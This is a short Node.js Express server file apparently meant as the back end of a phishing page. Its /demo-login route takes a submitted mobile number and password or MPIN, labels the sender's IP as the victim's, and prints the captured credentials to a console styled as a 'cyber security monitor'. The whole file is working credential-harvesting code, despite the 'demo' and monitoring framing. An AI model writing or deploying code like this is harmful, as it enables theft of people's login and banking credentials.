const express = require("express");
const cors = require("cors");

async function startServer() {
  const chalk = (await import("chalk")).default;

  const app = express();

  app.use(cors());
  app.use(express.json());
app.post("/demo-login", (req, res) => {
  const { mobileNumber, password, rememberMe } = req.body;
  
  // Get the IP address
  const victimIP = req.ip || req.headers['x-forwarded-for'] || req.socket.remoteAddress;

  console.clear();
  console.log(chalk.green("==================================="));
  console.log(chalk.green("    CYBER SECURITY MONITOR v1.0"));
  console.log(chalk.green("==================================="));
  console.log(chalk.yellow(`Intercepting packet from: ${victimIP}`)); // Display IP
  console.log("");
  console.log(chalk.red("MOBILE NUMBER:"), chalk.white(mobileNumber || "MISSING"));
  console.log(chalk.red("PASSWORD/MPIN:"), chalk.white(password || "MISSING"));
  console.log(chalk.red("REMEMBER ME:"), chalk.white(rememberMe));
  console.log(chalk.green("[STATUS] Capture complete"));

  res.json({ message: "Login captured successfully" });
});

  app.listen(5000, () => {
    console.log(chalk.green("Server running on port 5000"));
  });
}

startServer();
